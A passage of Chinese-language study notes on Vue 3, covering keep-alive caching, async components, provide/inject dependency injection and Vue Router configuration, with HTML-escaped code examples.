v-else&gt;&lt;/B&gt;&lt;/keep-alive&gt; 可以使用组件文件名字符串的形式来指定开启哪个组件的缓存，这样除了被开启的组件以外，其他组件都将在切换时被卸载 包含一个exclude属性： 用于指定不被缓存的组件，用法与include一致 包含一个max属性： 接收一个数组，用于指定最大被缓存组件数，使用LRU算法维护一个队列 即当缓存数量达到上限时，将会把最早缓存的组件卸载 注意事项： 开启keep-alive的组件会多两个生命周期： onActivated 被缓存组件每次消失时都会触发 onDeactivated 被缓存组件每次消失时都会触发 组件被卸载 A组件 组件被切换之后，出发组件的卸载相关钩子函数，控制台会显示组件卸载的信息 需要注意的是，组件卸载后重新挂载时，数据信息会变为初始值。因此切换前将老数据变为新数据后，切换后仍然显示老数据 1234567891011121314151617181920212223242526&lt;template&gt; &lt;h3&gt; ComponentA &lt;/h3&gt; &lt;p&gt; &#123;&#123; message &#125;&#125; &lt;/p&gt; &lt;button @click=&quot;updateHandle&quot;&gt; 更新数据 &lt;/button&gt;&lt;/template&gt;&lt;script&gt; export default &#123; beforeUnmount() &#123; console.log(&quot;组件卸载之前&quot;); &#125;, unmounted() &#123; console.log(&quot;组件卸载完成&quot;) &#125;, methods: &#123; updateHandle() &#123; this.message = &quot;新数据&quot; &#125; &#125; &#125;&lt;/script&gt; B组件 1234567&lt;template&gt; &lt;h3&gt; ComponentB &lt;/h3&gt;&lt;/template&gt;&lt;script&gt;&lt;/script&gt; 容器组件 当我们使用keep-alive组件将component组件包裹时，切换后组件则不会进入卸载生命周期 12345678910111213141516171819202122232425262728293031&lt;template&gt; &lt;h3&gt; 容器 &lt;/h3&gt; &lt;keep-live&gt; &lt;component :is=&quot;tabComponent&quot;&gt;&lt;/component&gt; &lt;/keep-live&gt; &lt;button @click=&quot;changeHandle&quot;&gt; 切换组件 &lt;/button&gt;&lt;/template&gt;&lt;script&gt; import ComponentA from &quot;./ComponentA.vue&quot; import ComponentB from &quot;./ComponentB.vue&quot; export default &#123; data() &#123; return &#123; tabComponent: &quot;ComponentA&quot; &#125; &#125;, methods: &#123; changeHandle()&#123; this.tabComponent = this.tabComponent == &quot;ComponentA&quot; ? &quot;ComponentB&quot; : &quot;ComponentA&quot; &#125; &#125; components: &#123; ComponentA, ComponentB &#125; &#125;&lt;/script&gt; 异步组件 在大型项目中，可能需要拆分应用为更小的块，这会导致项目包含很多很多组件，因此应付实现在需要的时候从服务器加载相关组件，以避免同时加载许多组件导致响应过慢。Vue提供了defineAsyncComponent方法来实现这样的异步加载的组件 123456789101112131415161718192021222324252627282930313233343536&lt;template&gt; &lt;h3&gt; 组件切换 &lt;/h3&gt; &lt;keep-live&gt; &lt;component :is=&quot;tabComponent&quot;&gt;&lt;/component&gt; &lt;/keep-live&gt; &lt;button @click=&quot;changeHandle&quot;&gt; 切换组件 &lt;/button&gt;&lt;/template&gt;&lt;script&gt; import &#123; defineAsyncComponent &#125; from &quot;vue&quot; import ComponentA from &quot;./ComponentA.vue&quot; // import ComponentB from &quot;./ComponentB.vue&quot; // 异步加载组件 const ComponentB = defineAsyncComponent(() =&gt; &#123; import(&quot;./ComponentB.vue&quot;) &#125;) export default &#123; data() &#123; return &#123; tabComponent: &quot;ComponentA&quot; &#125; &#125;, methods: &#123; changeHandle()&#123; this.tabComponent = this.tabComponent == &quot;ComponentA&quot; ? &quot;ComponentB&quot; : &quot;ComponentA&quot; &#125; &#125; components: &#123; ComponentA, ComponentB &#125; &#125;&lt;/script&gt; Vue3提供了一个更方便的异步组件渲染方式Suspense，该组件包含两个插槽，一个是确认要渲染的组件#default，另一个是临时渲染占位的组件#fallback 注意此处的defineAsyncComponent中需要使用import的函数形式： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;template&gt; &lt;div class=&quot;ender-content&quot;&gt; &lt;div class=&quot;ender-content__item&quot;&gt; &lt;waterFallVue :list=&quot;list&quot;&gt;&lt;/waterFallVue&gt; &lt;/div&gt; &lt;div class=&quot;ender-content__item&quot;&gt; &lt;Suspense&gt; &lt;template #default&gt; &lt;syncVue&gt;&lt;/syncVue&gt; &lt;/template&gt; &lt;template #fallback&gt; &lt;Skeleton&gt;&lt;/Skeleton&gt; &lt;/template&gt; &lt;/Suspense&gt; &lt;/div&gt; &lt;/div&gt;&lt;/template&gt;&lt;script setup lang=&quot;ts&quot;&gt;import &#123; ref, reactive, defineAsyncComponent &#125; from &#x27;vue&#x27;import waterFallVue from &#x27;../../components/WaterFall/water-fall.vue&#x27;import Skeleton from &#x27;../../components/Skeleton/skeleton.vue&#x27;const syncVue = defineAsyncComponent(() =&gt; import(&#x27;../../components/SyncCom/index.vue&#x27;))const list = [ &#123; height: 300, background: &#x27;red&#x27; &#125;, &#123; height: 400, background: &#x27;pink&#x27; &#125;, &#123; height: 500, background: &#x27;blue&#x27; &#125;]&lt;/script&gt;&lt;style scoped lang=&quot;scss&quot;&gt;@include b(content) &#123; flex: 1; background-color: #fff; overflow: auto; overflow-y: hidden; padding: 0 10px; display: flex; flex-direction: column; @include e(item) &#123; flex: 1; overflow: auto; border-bottom: 1px solid #ccc; padding: 10px; &#125;&#125;&lt;/style&gt; 此外defineAsyncComponent除了上述的回调函数写法，还有另外的一种对象写法： 12345const syncVue = defineAsyncComponent(&#123; loadingComponent:, errorComponent:, timeout:&#125;) 注意事项： 使用异步组件的好处在于： 不使用异步组件时，使用npm run build打包后会讲所有代码打包为一个js文件 使用异步组件后，打包会讲异步组件单独打包为另一个js 这样讲缩小主js文件的体积，缩短加载的时间，而异步组件对应的js文件只有在使用时才会被加载，优化用户体验。 依赖注入 VUE通过原型链的方式实现依赖注入，angular则是使用IOC和DI的方式实现 依赖注入用于解决，某一深层的子孙组件需要一个来自距离自己较远的祖先组件的数据。 vue种使用provide和inject来解决这一问题，一个父组件对于其所有后代组件，作为依赖提供者，所有后代组件，都可以注入由父组件给整条链路的依赖 需要注意的是如果要传递动态数据，则provide要使用函数的形式 祖先组件 123456789101112131415161718192021222324252627&lt;template&gt; &lt;h3&gt; 祖先 &lt;/h3&gt; &lt;Parent /&gt;&lt;/template&gt;&lt;script&gt; import Parent from &quot;./components/Parent.vue&quot; export default &#123; data() &#123; return&#123; activeMessage: &quot;祖先的财产&quot; &#125; &#125;, provide: &#123; message: &quot;祖先财产&quot; &#125;, provide() &#123; return &#123; message: this.activeMessage &#125; &#125;, components: &#123; Parent &#125; &#125;&lt;/script&gt; 父组件 12345678910111213141516171819&lt;template&gt; &lt;h3&gt; Parent &lt;/h3&gt; &lt;Child /&gt;&lt;/template&gt;&lt;script&gt; import Child from &quot;./components/Child.vue&quot; export default &#123; data() &#123; return&#123; &#125; &#125;, components: &#123; Child &#125; &#125;&lt;/script&gt; 子孙组件 子孙组件如果要将注入的数据作为动态数据，则直接使用this访问并赋值即可 123456789101112131415161718192021&lt;template&gt; &lt;h3&gt; Child &lt;/h3&gt; &lt;p&gt; &#123;&#123; message &#125;&#125; &lt;/p&gt; &lt;p&gt; &#123;&#123; fullMessage &#125;&#125; &lt;/p&gt;&lt;/template&gt;&lt;script&gt; export default &#123; inject: [&quot;message&quot;], data() &#123; return&#123; fullMessage: this.message &#125; &#125; &#125;&lt;/script&gt; 注意事项： 依赖注入与props一样是单向的 传递动态数据 在setup语法糖模式下可以使用provide的函数形式，可以传递响应式的数据，并且子孙组件对数据的修改也会引起父组件的更新，可以使用readonly加以限制 父组件： 12345&lt;script setup lang=&quot;ts&quot;&gt; import &#123; ref, reactive, provide &#125; from &#x27;vue&#x27; const message = ref&lt;string&gt;(&#x27;red&#x27;); provide(&#x27;msg&#x27;, message)&lt;/script&gt; 子组件 123456789&lt;script setup lang=&quot;ts&quot;&gt; import &#123; ref, reactive, inject &#125; from &#x27;vue&#x27; import type &#123; Ref &#125; from &#x27;vue&#x27; const message = inject&lt;Ref&lt;string&gt;&gt;(&#x27;msg&#x27;) const change = () =&gt; &#123; // 使用非空断言访问 message!.value = &#x27;yellow&#x27; &#125;&lt;/script&gt; 全局注入 可以在main.js种直接提供全局数据 min.js 12345678import &#123; createApp &#125; from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;const app = creare(App)app.provide(&quot;globalData&quot;, &quot;全局数据&quot;)app.mount(&#x27;#app&#x27;) 子组件依然使用inject: [&quot;globalData&quot;]接受即可 Vue应用 应用实例 每个Vue应用通过createApp函数来创建一个Vue应用实例，使用脚手架创建的项目目录下的main.js即有如下写法 在一个项目种，有且仅有一个Vue实例对象 123456import &#123; createApp &#125; from &#x27;vue&#x27;// something thingconst app = creareApp(&#123; /* 根组件选项 */&#125;) 根组件 上述代码传入createApp的对象实际上是一个组件，每个项目都需要一个根组件，其他组件均为其子组件。 12345import &#123; createApp &#125; from &#x27;vue&#x27;// 从一个单文件组件种导入根组件import App from &#x27;./App,vue&#x27;const app = createApp(App) 挂载应用 应用实例必须调用.mount方法后才能渲染，该方法接受一个容器参数，可以是一个实际的DOM元素或一个CSS选择器字符串 1app.mount(&quot;#app&quot;) 1&lt;div id=&quot;app&quot;&gt;&lt;/div&gt; 公共资源文件夹 在src下会有一个assets文件夹，用来存放公共资源 Vue Router Vue是组件式的开发，那么与React将面临同样的问题，就是URL如何映射到单个组件上。 因为我们知道浏览器认识的语言只有HTML、CSS、JS，那么路由的作用就是告诉浏览器什么时候该渲染那个组件。 我们先从一个例子来感受一下Vue Router的作用 入门 12345678910111213141516&lt;script src=&quot;https://unpkg.com/vue@3&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://unpkg.com/vue-router@4&quot;&gt;&lt;/script&gt;&lt;div id=&quot;app&quot;&gt; &lt;h1&gt;Hello App!&lt;/h1&gt; &lt;p&gt; &lt;!--使用 router-link 组件进行导航 --&gt; &lt;!--通过传递 `to` 来指定链接 --&gt; &lt;!--`&lt;router-link&gt;` 将呈现一个带有正确 `href` 属性的 `&lt;a&gt;` 标签--&gt; &lt;router-link to=&quot;/&quot;&gt;Go to Home&lt;/router-link&gt; &lt;router-link to=&quot;/about&quot;&gt;Go to About&lt;/router-link&gt; &lt;/p&gt; &lt;!-- 路由出口 --&gt; &lt;!-- 路由匹配到的组件将渲染在这里 --&gt; &lt;router-view&gt;&lt;/router-view&gt;&lt;/div&gt; router-link 此处并没有使用a标签来处理跳转，原因是Vue Router中的router-link可以在不重新加载页面的情况下更改URL router-view 此处显示与url对应的组件。 12345678910111213141516171819202122232425262728293031// 1. 定义路由组件.// 也可以从其他文件导入const Home = &#123; template: &#x27;&lt;div&gt;Home&lt;/div&gt;&#x27; &#125;const About = &#123; template: &#x27;&lt;div&gt;About&lt;/div&gt;&#x27; &#125;// 2. 定义一些路由// 每个路由都需要映射到一个组件。// 我们后面再讨论嵌套路由。const routes = [ &#123; path: &#x27;/&#x27;, component: Home &#125;, &#123; path: &#x27;/about&#x27;, component: About &#125;,]// 3. 创建路由实例并传递 `routes` 配置// 你可以在这里输入更多的配置，但我们在这里// 暂时保持简单const router = VueRouter.createRouter(&#123; // 4. 内部提供了 history 模式的实现。为了简单起见，我们在这里使用 hash 模式。 history: VueRouter.createWebHashHistory(), routes, // `routes: routes` 的缩写&#125;)// 5. 创建并挂载根实例const app = Vue.createApp(&#123;&#125;)//确保 _use_ 路由实例使//整个应用支持路由。app.use(router)app.mount(&#x27;#app&#x27;)// 现在，应用已经启动了！ 调用app.use(router)触发第一次导航并且可以在任意组件中以this.$router的形式访问它，并且以this.$router的形式访问当前路由： 123456789101112131415161718// Home.vueexport default &#123; computed: &#123; username() &#123; // 我们很快就会看到 `params` 是什么 return this.$route.params.username &#125;, &#125;, methods: &#123; goToDashboard() &#123; if (isAuthenticated) &#123; this.$router.push(&#x27;/dashboard&#x27;) &#125; else &#123; this.$router.push(&#x27;/login&#x27;) &#125; &#125;, &#125;,&#125; 要在 setup 函数中访问路由，请调用 useRouter 或 useRoute 函数。我们将在 Composition API 中了解更多信息。 在整个文档中，我们会经常使用 router 实例，请记住，this.$router 与直接使用通过 createRouter 创建的 router 实例完全相同。我们使用 this.$router 的原因是，我们不想在每个需要操作路由的组件中都导入路由。 脚手架抽离 事实上在脚手架中配置路由时，我们希望家路由从业务逻辑中抽离，使得维护和扩展时变得方便，例如新建一个Router目录后创建index.js文件，将路由全部写在此处后，将router抛出： 12345678910111213141516171819202122232425import &#123; createRouter, createWebHistory, RouteRecordRaw &#125; from &#x27;vue-router&#x27;import HomeView from &#x27;../views/HomeView.vue&#x27;const routes:Array&lt;RouteRecordRaw&gt; = [ &#123; path: &#x27;/&#x27;, name: &#x27;home&#x27;, component: HomeView &#125;, &#123; path: &#x27;/about/:id&#x27;, name: &#x27;about&#x27;, // route level code-splitting // this generates a separate chunk (About.[hash].js) for this route // which is lazy-loaded when the route is visited. component: () =&gt; import(&#x27;../views/AboutView.vue&#x27;) &#125;]const router = createRouter(&#123; history: createWebHistory(import.meta.env.BASE_URL), routes&#125;)export default router 带参数的动态路由 有时我们希望路由前往的页面根据不同情况显示不同的效果，例如可能有一个User组件，它需要对所有用户进行渲染，但用户ID不同，需要显示的ID内容也不同，Vue Router中可以在路径中使用一个动态字段来实现，称之为路径参数 123456789const User = &#123; template: &#x27;&lt;div&gt;User&lt;/div&gt;&#x27;,&#125;// 这些都会传递给 `createRouter`const routes = [ // 动态字段以冒号开始 &#123; path: &#x27;/users/:id&#x27;, component: User &#125;,] 那么现在如果有两个用户：johnny、jolyne 那么以下两个路径将会映射到同一个组件： /users/johnny /users/jolyne 路径参数使用:表示，当一个路由被匹配时，params值将在每个组件中以this.$router.params的形式暴露出来，因此在User组件的模板中我们可以这样显示： 123const User = &#123; template: &#x27;&lt;div&gt;User &#123;&#123; $route.params.id &#125;&#125;&lt;/div&gt;&#x27;,&#125; 路径与params的对应关系如下： 模式串 路径 $router.params /users/:username /users/eduardo &#123;username: 'eduardo'&#125; /users/:username/posts/:postId /users/eduardo/posts/123 &#123; username: 'eduardo', postId: '123' &#125; 响应路由参数变化 如果使用上述方式渲染同一组件，那么当发生用户切换时，由于两个路径映射了同一组件，Vue Router使用的策略是直接复用这一组件，而不是销毁后再创建。 那么这也一位置，URL更新了，但是组件的生命周期钩子函数并不会被触发。 因此需要使用侦听器来对$route.params来监听其变化 123456789101112131415// 选项式APIwatch: &#123; &quot;$route.params&quot;: &#123; handler(newValue, oldValue) &#123; console.log(&quot;previous: &quot;, oldValue) console.log(&quot;to: &quot;, newValue) &#125; &#125;&#125;// 组合式APIwatch(() =&gt; this.$route.params, (toParams, previousParams) =&gt; &#123; // 对路由变化做出响应...&#125;) 或者可以使用beforeRouteUpdate导航守卫，可以取消导航： 1234567const User = &#123; template: &#x27;...&#x27;, async beforeRouteUpdate(to, from) &#123; // 对路由变化做出响应... this.userData = await fetchUser(to.params.id) &#125;,&#125; 捕获所有路由或 404 Not found 路由 常规参数只匹配 url 片段之间的字符，用 / 分隔。如果我们想匹配任意路径，我们可以使用自定义的 路径参数 正则表达式，在 路径参数 后面的括号中加入 正则表达式 : 123456const routes = [ // 将匹配所有内容并将其放在 `$route.params.pathMatch` 下 &#123; path: &#x27;/:pathMatch(.*)*&#x27;, name: &#x27;NotFound&#x27;, component: NotFound &#125;, // 将匹配以 `/user-` 开头的所有内容，并将其放在 `$route.params.afterUser` 下 &#123; path: &#x27;/user-:afterUser(.*)&#x27;, component: UserGeneric &#125;,] 在这个特定的场景中，我们在括号之间使用了自定义正则表达式，并将pathMatch 参数标记为可选可重复。这样做是为了让我们在需要的时候，可以通过将 path 拆分成一个数组，直接导航到路由： 12345678this.$router.push(&#123; name: &#x27;NotFound&#x27;, // 保留当前路径并删除第一个字符，以避免目标 URL 以 `//` 开头。 params: &#123; pathMatch: this.$route.path.substring(1).split(&#x27;/&#x27;) &#125;, // 保留现有的查询和 hash 值，如果有的话 query: this.$route.query, hash: this.$route.hash,&#125;) 高级匹配模式 Vue Router 使用自己的路径匹配语法，其灵感来自于 express，因此它支持许多高级匹配模式，如可选的参数，零或多个 / 一个或多个，甚至自定义的正则匹配规则。请查看高级匹配文档来探索它们。! 路由传参数 使用编程时导航时可以利用query和parms两个参数进行传参 两者的区别： query 传参配置的是 path，而 params 传参配置的是name，在 params中配置 path 无效 query 在路由配置不需要设置参数，而 params 必须设置 query 传递的参数会显示在地址栏中 params传参刷新会无效，但是 query 会保存传递过来的值，刷新不变 ; 路由配置 1234567891011121314151617181920212223// query 传参router.push(&#123; path: &quot;/reg&quot;, query: &#123; name: &quot;jj&quot; &#125;&#125;)// query 接收参数import &#123;useRoute&#125; from &quot;vue-router&quot;// 注意接收参数是使用routeconst route = useRoute()route.query.name// parms 传参router.push(&#123; name: &quot;reg&quot;, parms: &#123; name: &quot;jj&quot; &#125;&#125;)// parms 接收参数 路由匹配语法 大多数情况下会使用/about 自定义正则 当定义像 :userId 这样的参数时，内部可以使用([^/])来从URL中提取参数 例如我们有两个路由：/:orderId和/:productName，如果两者恰好匹配了相同的URL，同时我们并不像使用额外的静态路由来区分两个URL，那我们就可以通过两个字段的特点来进行区分： 例如对于orderId而言，他的取值总是一个数字，而productName的取值可以是任何形式，所以Vue Router支持在括号中为参数指定一个自定义的正则： 123456const routes = [ // /:orderId -&gt; 仅匹配数字 &#123; path: &#x27;/:orderOd(\\\\d+)&#x27; &#125;, // /:porductName -&gt; 匹配其他任何内容 &#123; path: &#x27;/:productName&#x27; &#125;,] routes中的顺序并不会影响匹配 注意事项： 确保转义反斜杠( \\ )，就像我们对 \\d (变成\\\\d)所做的那样，在 JavaScript 中实际传递字符串中的反斜杠字符。 可重复参数 匹配例如/one/two/three这样的多个序列的地址 123456const routes = [ // /:chapters -&gt; 匹配 /one, /one/two, /one/two/three, 等 &#123; path: &#x27;/:chapters+&#x27; &#125;, // /:chapters -&gt; 匹配 /, /one, /one/two, /one/two/three, 等 &#123; path: &#x27;/:chapters*&#x27; &#125;,] 接受时则需要使用一个数组来接收，并且在使用命名路由时也需要传递一个数组： 123456789// 给定 &#123; path: &#x27;/:chapters*&#x27;, name: &#x27;chapters&#x27; &#125;,router.resolve(&#123; name: &#x27;chapters&#x27;, params: &#123; chapters: [] &#125; &#125;).href// 产生 /router.resolve(&#123; name: &#x27;chapters&#x27;, params: &#123; chapters: [&#x27;a&#x27;, &#x27;b&#x27;] &#125; &#125;).href// 产生 /a/b// 给定 &#123; path: &#x27;/:chapters+&#x27;, name: &#x27;chapters&#x27; &#125;,router.resolve(&#123; name: &#x27;chapters&#x27;, params: &#123; chapters: [] &#125; &#125;).href// 抛出错误，因为 `chapters` 为空 此外也可以与自定义正则相结合： 1234567const routes = [ // 仅匹配数字 // 匹配 /1, /1/2, 等 &#123; path: &#x27;/:chapters(\\\\d+)+&#x27; &#125;, // 匹配 /, /1, /1/2, 等 &#123; path: &#x27;/:chapters(\\\\d+)*&#x27; &#125;,] sensitive和strict路由配置 默认情况下路由和标准URL一致不区分大小写，但可以通过strict和sensitive来切换，它们可以既可以应用在整个全局路由上，又可以应用于当前路由上： 123456789101112const router = createRouter(&#123; history: createWebHistory(), routes: [ // 将匹配 /users/posva 而非： // - /users/posva/ 当 strict: true // - /Users/posva 当 sensitive: true &#123; path: &#x27;/users/:id&#x27;, sensitive: true &#125;, // 将匹配 /users, /Users, 以及 /users/42 而非 /users/ 或 /users/42/ &#123; path: &#x27;/users/:id?&#x27; &#125;, ], strict: true, // applies to all routes&#125;) 可修改参数 可以使用?修饰符将一个参数标记为可选项： 123456const routes = [ // 匹配 /users 和 /users/posva &#123; path: &#x27;/users/:userId?&#x27; &#125;, // 匹配 /users 和 /users/42 &#123; path: &#x27;/users/:userId(\\\\d+)?&#x27; &#125;,] 嵌套路由 UI通常是由多层嵌套的组件构成例如： 12345678/user/johnny/profile /user/johnny/posts+------------------+ +-----------------+| User | | User || +--------------+ | | +-------------+ || | Profile | | +------------&gt; | | Posts | || | | | | | | || +--------------+ | | +-------------+ |+------------------+ +-----------------+ Vue Router可以使用嵌套路由来表达这种关系 例如上文提到的结构： 123&lt;div id=&quot;app&quot;&gt; &lt;router-view&gt;&lt;/router-view&gt;&lt;/div&gt; 123456const User = &#123; template: &#x27;&lt;div&gt;User &#123;&#123; $route.params.id &#125;&#125;&lt;/div&gt;&#x27;,&#125;// 这些都会传递给 `createRouter`const routes = [&#123; path: &#x27;/user/:id&#x27;, component: User &#125;] 此处 &lt;router-view&gt;&lt;/router-view&gt;将作为一个顶层router-view。接着我们再向其中嵌套一层router-view，例如在User组件的模板中添加： 12345678const User = &#123; template: ` &lt;div class=&quot;user&quot;&gt; &lt;h2&gt;User &#123;&#123; $route.params.id &#125;&#125;&lt;/h2&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt; `,&#125; 接着需要在路由中配置children： 1234567891011121314151617181920const routes = [ &#123; path: &#x27;/user/:id&#x27;, component: User, children: [ &#123; // 当 /user/:id/profile 匹配成功 // UserProfile 将被渲染到 User 的 &lt;router-view&gt; 内部 path: &#x27;profile&#x27;, component: UserProfile, &#125;, &#123; // 当 /user/:id/posts 匹配成功 // UserPosts 将被渲染到 User 的 &lt;router-view&gt; 内部 path: &#x27;posts&#x27;, component: UserPosts, &#125;, ], &#125;,] 注意，以 / 开头的嵌套路径将被视为根路径。这允许你利用组件嵌套，而不必使用嵌套的 URL。 需要注意的是，使用如上配置后，当我们访问/user/eduardo时，页面并不能找到对应的组件，因为并没有这一路径的匹配方式。如果希望在父子组件之间显示一些内容的话需要添加一个空的嵌套路径： 12345678910111213const routes = [ &#123; path: &#x27;/user/:id&#x27;, component: User, children: [ // 当 /user/:id 匹配成功 // UserHome 将被渲染到 User 的 &lt;router-view&gt; 内部 &#123; path: &#x27;&#x27;, component: UserHome &#125;, // ...其他子路由 ], &#125;,] 嵌套命名路由 处理命名路由时，通常回给子路由命名： 12345678const routes = [ &#123; path: &#x27;/user/:id&#x27;, component: User, // 请注意，只有子路由具有名称 children: [&#123; path: &#x27;&#x27;, name: &#x27;user&#x27;, component: UserHome &#125;], &#125;,] 这将确保导航到 /user/:id 时始终显示嵌套路由。 在一些场景中，你可能希望导航到命名路由而不导航到嵌套路由。例如，你想导航 /user/:id 而不显示嵌套路由。那样的话，你还可以命名父路由，但请注意重新加载页面将始终显示嵌套的子路由，因为它被视为指向路径/users/:id 的导航，而不是命名路由： 12345678const routes = [ &#123; path: &#x27;/user/:id&#x27;, name: &#x27;user-parent&#x27;, component: User, children: [&#123; path: &#x27;&#x27;, name: &#x27;user&#x27;, component: UserHome &#125;], &#125;,] 编程式导航 除了使用 &lt;router-link&gt; 创建 a 标签来定义导航链接，我们还可以借助 router 的实例方法，通过编写代码来实现。 想要导航到不同的 URL，可以使用 router.push 方法。这个方法会向 history 栈添加一个新的记录，所以，当用户点击浏览器后退按钮时，会回到之前的 URL。 当你点击 &lt;router-link&gt; 时，内部会调用这个方法，所以点击 &lt;router-link :to=&quot;...&quot;&gt; 相当于调用 router.push(...) ： 声明式 编程式 &lt;router-link :to=&quot;...&quot;&gt; router.push(...) 该方法的使用方法如下： 1234567891011121314// 字符串路径router.push(&#x27;/users/eduardo&#x27;)// 带有路径的对象router.push(&#123; path: &#x27;/users/eduardo&#x27; &#125;)// 命名的路由，并加上参数，让路由建立 urlrouter.push(&#123; name: &#x27;user&#x27;, params: &#123; username: &#x27;eduardo&#x27; &#125; &#125;)// 带查询参数，结果是 /register?plan=privaterouter.push(&#123; path: &#x27;/register&#x27;, query: &#123; plan: &#x27;private&#x27; &#125; &#125;)// 带 hash，结果是 /about#teamrouter.push(&#123; path: &#x27;/about&#x27;, hash: &#x27;#team&#x27; &#125;) 注意：如果提供了 path，params 会被忽略，上述例子中的 query 并不属于这种情况。取而代之的是下面例子的做法，你需要提供路由的 name 或手写完整的带有参数的 path ： 123456789101112const username = &#x27;eduardo&#x27;// 我们可以手动建立 url，但我们必须自己处理编码router.push(`/user/$&#123;username&#125;`) // -&gt; /user/eduardo// 同样router.push(&#123; path: `/user/$&#123;username&#125;` &#125;) // -&gt; /user/eduardo// 如果可能的话，使用 `name` 和 `params` 从自动 URL 编码中获益router.push(&#123; name: &#x27;user&#x27;, params: &#123; username &#125; &#125;) // -&gt; /user/eduardo// `params` 不能与 `path` 一起使用router.push(&#123; path: &#x27;/user&#x27;, params: &#123; username &#125; &#125;) // -&gt; /user 当指定 params 时，可提供 string 或 number 参数（或者对于可重复的参数可提供一个数组）。任何其他类型（如 undefined、false 等）都将被自动字符串化。对于可选参数，你可以提供一个空字符串（&quot;&quot;）来跳过它。 to和router.push接受的对象种类相同，两者规则也相同 router.push 和所有其他导航方法都会返回一个 Promise，让我们可以等到导航完成后才知道是成功还是失败。 替代当前位置 它的作用类似于 router.push，唯一不同的是，它在导航时不会向 history 添加新记录，正如它的名字所暗示的那样——它取代了当前的条目。 声明式 编程式 &lt;router-link :to=&quot;...&quot; replace&gt; router.replace(...) 也可以直接在传递给 router.push 的 routeLocation 中增加一个属性 replace: true ： 123router.push(&#123; path: &#x27;/home&#x27;, replace: true &#125;)// 相当于router.replace(&#123; path: &#x27;/home&#x27; &#125;) 使用replace进行跳转将不会留下历史记录（即浏览器无法进行前进后退 横跨历史 该方法采用一个整数作为参数，表示在历史堆栈中前进或后退多少步，类似于 window.history.go(n)。 1234567891011121314// 向前移动一条记录，与 router.forward() 相同router.go(1)// 返回一条记录，与 router.back() 相同router.go(-1)router.back(1)// 前进 3 条记录router.go(3)// 如果没有那么多记录，静默失败router.go(-100)router.back(100)router.go(100) 篡改历史 router.push、router.replace、router.go实际上是windows.historyAPI的模仿 例如使用&lt;router-link replace to=&quot;/&quot;&gt;&lt;/router-link&gt;标签进行的跳转不会留下历史记录 因此其中很多与Browser History APIs类似的操作 值得一提的是，无论在创建路由器实例时传递什么样的 history 配置，Vue Router 的导航方法( push、replace、go )都能始终正常工作。 命名路由 除了使用path进行路由以外，还可以使用name进行路由。 该方式具有如下优点： 没有硬编码的URL params的自动编码/解码 防止在url中出现打错字 绕过路径排序（如显示一个） 1234567const routes = [ &#123; path: &#x27;/user/:username&#x27;, name: &#x27;user&#x27;, component: User, &#125;,] 要链接到一个命名的路由，可以向 router-link 组件的 to 属性传递一个对象： 123&lt;router-link :to=&quot;&#123; name: &#x27;user&#x27;, params: &#123; username: &#x27;erina&#x27; &#125;&#125;&quot;&gt; User&lt;/router-link&gt; 对应的编程式导航写法如下： 12router.push(&#123; name: &#x27;user&#x27;, params: &#123; username: &#x27;erina&#x27; &#125; &#125;)// 路由地址：/user/erina 命名视图 有时候想同时 (同级) 展示多个视图，而不是嵌套展示，例如创建一个布局，有 sidebar (侧导航) 和 main (主内容) 两个视图，这个时候命名视图就派上用场了。你可以在界面中拥有多个单独命名的视图，而不是只有一个单独的出口。如果 router-view 没有设置名字，那么默认为 default 123&lt;router-view class=&quot;view left-sidebar&quot; name=&quot;LeftSidebar&quot;&gt;&lt;/router-view&gt;&lt;router-view class=&quot;view main-content&quot;&gt;&lt;/router-view&gt;&lt;router-view class=&quot;view right-sidebar&quot; name=&quot;RightSidebar&quot;&gt;&lt;/router-view&gt; 一个视图使用一个组件渲染，因此对于同个路由，多个视图就需要多个组件。确保正确使用 components 配置： 123456789101112131415const router = createRouter(&#123; history: createWebHashHistory(), routes: [ &#123; path: &#x27;/&#x27;, components: &#123; default: Home, // LeftSidebar: LeftSidebar 的缩写 LeftSidebar, // 它们与 `&lt;router-view&gt;` 上的 `name` 属性匹配 RightSidebar, &#125;, &#125;, ],&#125;) 嵌套命名试图 有时候对于更复杂的页面，可能需要使用命名试图创建嵌套视图的复杂布局。例如如下页面： 123456789/settings/emails /settings/profile+-----------------------------------+ +------------------------------+| UserSettings | | UserSettings || +-----+-------------------------+ | | +-----+--------------------+ || | Nav | UserEmailsSubscriptions | | +------------&gt; | | Nav | UserProfile | || | +-------------------------+ | | | +--------------------+ || | | | | | | | UserProfilePreview | || +-----+-------------------------+ | | +-----+--------------------+ |+-----------------------------------+ +------------------------------+ Nav 只是一个常规组件。 UserSettings 是一个视图组件。 UserEmailsSubscriptions、UserProfile、UserProfilePreview 是嵌套的视图组件。 其中UserSettings组件的template结构如下： 1234567&lt;!-- UserSettings.vue --&gt;&lt;div&gt; &lt;h1&gt;User Settings&lt;/h1&gt; &lt;NavBar /&gt; &lt;router-view /&gt; &lt;router-view name=&quot;helper&quot; /&gt;&lt;/div&gt; 那么接下来可以通过如下的路由配置事项上述布局： 123456789101112131415&#123; path: &#x27;/settings&#x27;, // 你也可以在顶级路由就配置命名视图 component: UserSettings, children: [&#123; path: &#x27;emails&#x27;, component: UserEmailsSubscriptions &#125;, &#123; path: &#x27;profile&#x27;, components: &#123; default: UserProfile, helper: UserProfilePreview &#125; &#125;]&#125; 重定向与别名 重定向 重定向可以使用routes配置来完成，例如将/home重定向到/: 1const routes = [&#123; path: &#x27;/home&#x27;, redirect: &#x27;/&#x27; &#125;] 重定向的目标也可以是一个命名的路由： 1const routes = [&#123; path: &#x27;/home&#x27;, redirect: &#123; name: &#x27;homepage&#x27; &#125; &#125;] 甚至是一个方法，动态返回重定向目标： 123456789101112131415const routes = [ &#123; // /search/screens -&gt; /search?q=screens path: &#x27;/search/:searchText&#x27;, redirect: to =&gt; &#123; // 方法接收目标路由作为参数 // return 重定向的字符串路径/路径对象 return &#123; path: &#x27;/search&#x27;, query: &#123; q: to.params.searchText &#125; &#125; &#125;, &#125;, &#123; path: &#x27;/search&#x27;, // ... &#125;,] 请注意，导航守卫并没有应用在跳转路由上，而仅仅应用在其目标上。在上面的例子中，在 /home 路由中添加 beforeEnter 守卫不会有任何效果。 在写 redirect 的时候，可以省略 component 配置，因为它从来没有被直接访问过，所以没有组件要渲染。唯一的例外是嵌套路由：如果一个路由记录有 children 和 redirect 属性，它也应该有 component 属性。 相对重定向 也可以重定向到相对位置： 123456789101112const routes = [ 